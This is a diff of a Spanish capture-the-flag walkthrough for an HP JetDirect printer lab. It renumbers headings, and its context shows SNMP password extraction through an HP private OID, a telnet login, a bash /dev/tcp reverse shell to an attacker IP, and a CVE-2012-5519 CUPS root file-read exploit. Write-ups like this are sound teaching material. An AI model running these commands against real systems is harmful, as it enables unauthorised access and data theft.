@@ -13,7 +13,7 @@
 
 ---
 
-## 1. Fase de enumeración
+## 1. Reconocimiento
 
 **Verificación de Conectividad**
 Una vez establecida la conexión VPN, se inicia la fase de reconocimiento verificando la disponibilidad del objetivo mediante la herramienta ping. Se envían cuatro paquetes ICMP para confirmar la comunicación:
@@ -36,7 +36,7 @@ El comando muestra una respuesta exitosa. Basándonos en el valor del TTL (Time 
 
 ---
 
-## Enumeración de puertos (TCP)
+## 2. Enumeración de puertos (TCP)
 
 Tras establecer conectividad con el objetivo, se procedió a realizar un escaneo exhaustivo de todo el rango de puertos **TCP (0-65535)** para identificar servicios expuestos.
 
@@ -44,7 +44,7 @@ Tras establecer conectividad con el objetivo, se procedió a realizar un escaneo
 nmap -p- --open --min-rate 5000 -sS -Pn -n 10.129.15.105 -oN full-ports.txt
 ```
 
-### Detección de versiones y servicios
+### 2.1 Detección de versiones y servicios
 
 Una vez identificado el **puerto 23 (Telnet)** como único puerto abierto, se procedió a realizar un escaneo dirigido utilizando el **Nmap Scripting Engine (NSE)** y la detección de versiones para profundizar en la naturaleza del servicio.
 
@@ -52,7 +52,7 @@ Una vez identificado el **puerto 23 (Telnet)** como único puerto abierto, se pr
 nmap -p 23 -sCV 10.129.15.105-oN service-detection.txt
 ```
 
-#### Análisis de Resultados e intento de acceso
+#### 2.2 Análisis de Resultados e intento de acceso
 
 Los resultados del escaneo y la interacción manual revelan que el servicio corresponde a una interfaz **HP JetDirect**, una tecnología de impresión común en redes corporativas.
 
@@ -71,13 +71,13 @@ Invalid password
 Connection closed by foreign host.
 ```
 
-##### Hallazgos y Siguientes Pasos
+##### 2.3 Hallazgos y Siguientes Pasos
 
 La respuesta del servidor confirma que el acceso está restringido mediante contraseña y que se trata de un dispositivo de impresión. Dado que el vector TCP no ofrece más puntos de entrada inmediatos, se ampliará el alcance de la auditoría hacia la **enumeración de puertos UDP**, buscando servicios adicionales como **SNMP**, los cuales suelen estar asociados a este tipo de dispositivos.
 
 ---
 
-## Enumeración de puertos (UDP)
+## 3. Enumeración de puertos (UDP)
 
 Debido a la naturaleza del protocolo UDP y la lentitud en su escaneo, optó por una estrategia de **optimización de rendimiento**. En lugar de un barrido completo, se realizó un escaneo dirigido a los **100 puertos más comunes** (`--top-ports 100`), ajustando la tasa de envío de paquetes para agilizar el proceso sin comprometer la fiabilidad de los resultados.
 
@@ -85,7 +85,7 @@ Debido a la naturaleza del protocolo UDP y la lentitud en su escaneo, optó por 
 nmap --top-ports 100 --open -sU --min-rate 5000 10.129.15.105 -oN UDP-scan.txt
 ```
 
-### Análisis de resultados
+### 3.1 Análisis de resultados
 
 El escaneo identificó el **puerto 161** en estado abierto, ejecutando el servicio **SNMP** (_Simple Network Management Protocol_).
 
@@ -96,7 +96,7 @@ PORT    STATE SERVICE VERSION
 161/udp open  snmp    SNMPv1 server (public)
 ```
 
-#### Hallazgos clave:
+#### 3.2 Hallazgos clave:
 
 - **Versión:** SNMPv1.
 - **Community String:** Se identificó la comunidad por defecto **"public"**.
@@ -104,7 +104,7 @@ PORT    STATE SERVICE VERSION
 
 ---
 
-## 3. Enumeración SNMP e identificación de vulnerabilidades
+## 4. Enumeración SNMP e identificación de vulnerabilidades
 
 Al ejecutar un volcado inicial de SNMP utilizando la comunidad `public`, el servicio devolvió una información extremadamente limitada, reportando únicamente la cadena descriptiva: **"HTB Printer"**.
 
@@ -113,7 +113,7 @@ snmpwalk -v 2c -c public 10.129.15.105
 iso.3.6.1.2.1 = STRING: "HTB Printer"
 ```
 
-### Búsqueda de vulnerabilidades con searchsploit
+### 4.1 Búsqueda de vulnerabilidades con searchsploit
 
 Ante la falta de información, se procedió a buscar vulnerabilidades específicas para servicios SNMP en dispositivos de impresión mediante `searchsploit`.
 
@@ -127,7 +127,7 @@ Se identificó un exploit crítico relacionado con la divulgación de credencial
  
 	**ID:** `hardware/remote/22319.txt`
 
-#### Explotación de Ramas Privadas y OIDs Específicos
+#### 4.2 Explotación de Ramas Privadas y OIDs Específicos
 
 El análisis del documento `22319.txt` revela que es posible evadir las restricciones de la MIB estándar consultando directamente la raíz del árbol o, de forma más precisa, un **OID de la rama privada de HP** que almacena la contraseña de administración en texto plano.
 
@@ -145,7 +145,7 @@ snmpwalk -v 2c -c public 10.129.15.105 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
 
 Este OID apunta a la configuración interna del servidor de impresión, donde a menudo se exponen parámetros de seguridad sin el control de acceso adecuado.
 
-##### Resultados
+##### 4.3 Resultados
 
 Una vez ejecutado el procedimiento se encuentra la siguiente cadena en formato decimal:
 
@@ -156,7 +156,7 @@ Una vez ejecutado el procedimiento se encuentra la siguiente cadena en formato d
 
 ---
 
-## 4. Decodificación de Credenciales e Intrusión
+## 5. Decodificación de Credenciales e Intrusión
 
 Tras ejecutar la consulta, el servicio SNMP devolvió una cadena de valores numéricos en formato **Decimal (ASCII)**. Estos valores representan los caracteres individuales de la contraseña de administración del dispositivo.
 
@@ -179,7 +179,7 @@ P@ssw0rd@123!!123�q��"2Rbs3CSs��$4�Eu�WGW�(8i   IY�aA�"1&1A5
 
 **Interpretación Técnica:** Los caracteres especiales (�) indican valores hexadecimales que no tienen una representación en la tabla ASCII estándar o que corresponden a instrucciones de control del dispositivo. Se identificó que la cadena legítima termina antes del primer carácter no alfanumérico, estableciendo la credencial probable como: `P@ssw0rd@123!!123`
 
-### Acceso al Sistema (Telnet)
+### 5.1 Acceso al Sistema (Telnet)
 
 Con la contraseña extraída, se procedió a validar el acceso al servicio **Telnet** en el puerto 23.
 
@@ -187,7 +187,7 @@ Con la contraseña extraída, se procedió a validar el acceso al servicio **Tel
 
 Tras validar la credencial `P@ssw0rd@123!!123`, se obtuvo acceso satisfactorio a la interfaz de línea de comandos (CLI) del dispositivo **HP JetDirect**.
 
-#### Enumeración de Comandos y Capacidades
+#### 5.2 Enumeración de Comandos y Capacidades
 
 Para determinar el alcance del control sobre el sistema, se ejecutó el comando de ayuda (`?`), revelando las funciones administrativas disponibles.
 
@@ -212,7 +212,7 @@ Tras obtener acceso, procedo a leer la primera flag: `89640183c63c5e17206516613f
 
 ---
 
-## 5. Establecimiento de Reverse Shell para Persistencia
+## 6. Establecimiento de Reverse Shell para Persistencia
 
 Tras confirmar la **Ejecución Remota de Comandos (RCE)**, el siguiente paso es estabilizar el acceso mediante una **reverse shell**. Para ello, preparo mi máquina local para recibir la conexión y ejecuto el _payload_ en el servidor objetivo.
  
@@ -230,11 +230,11 @@ nc -lvnp 4444
 exec bash -c "bash -i >& /dev/tcp/10.10.14.37/4444 0>&1"
 ```
 
-### Estabilización de la TTY: De Shell Limitada a Interactiva
+### 6.1 Estabilización de la TTY: De Shell Limitada a Interactiva
 
 Cuando obtenemos una _reverse shell_ con `netcat`, la terminal suele ser "tonta" (no tiene autocompletado, no permite usar `Ctrl+C` sin cerrarse y no tiene historial). Para solucionar esto, seguimos este proceso de estabilización:
 
- **1. Generar la Terminal Interactiva**
+**1. Generar la Terminal Interactiva**
 
 El primer paso es invocar un entorno de shell real. Podemos intentar dos métodos dependiendo de lo que esté instalado en la víctima:
 
@@ -278,9 +278,9 @@ export TERM=xterm # Permite comandos visuales como 'clear' o 'Ctrl+L'
 
 ---
 
-## Lectura de archivos sensible y visualización de información sensible
+## 7. Lectura de archivos sensibles con privilegios root
 
-### 1. Enumeración de Servicios Internos
+### 7.1 Enumeración de Servicios Internos
 
 Tras estabilizar la TTY, inicio una fase de enumeración interna para identificar vectores de escalada. Al listar los puertos en escucha en la interfaz de _loopback_ con el comando `netstat -ant`, identifico un servicio sospechoso:
 
@@ -304,11 +304,11 @@ curl http://localhost:631
 </HEAD>
 ```
 
-### 2. Análisis de Vulnerabilidad (CVE-2012-5519)
+### 7.2 Análisis de Vulnerabilidad (CVE-2012-5519)
 
 La versión **1.6.1** de CUPS es vulnerable al **CVE-2012-5519**. Este fallo permite a los usuarios pertenecientes al grupo `lpadmin` (como es el caso de nuestro usuario actual `lp`) leer o escribir archivos arbitrarios con privilegios de superusuario. El problema reside en una gestión incorrecta de las directivas de configuración en la interfaz web, que permite redirigir archivos de registro o error a rutas sensibles del sistema.
 
-### 3. Transferencia y Ejecución del Exploit
+### 7.3 Transferencia y Ejecución del Exploit
 
 Para automatizar este proceso, utilizo el script `cups-root-file-read.sh` del repositorio de [p1ckzi](https://github.com/p1ckzi/CVE-2012-5519). Dado que la máquina de HTB no tiene salida a Internet, realizo la transferencia de archivos de forma manual.
 
@@ -326,7 +326,7 @@ chmod +x cups-root-file-read.sh                          # Asigno permisos de ej
 ./cups-root-file-read.sh                                 # Ejecuto el script
 ```
 
-#### Resultados de ejecución
+#### 7.4 Resultados de ejecución
 
 Una vez ejecutado el script puedo ver el contenido de cualquier archivo indicando la ruta del mismo al script, como se observa a continuación.
 
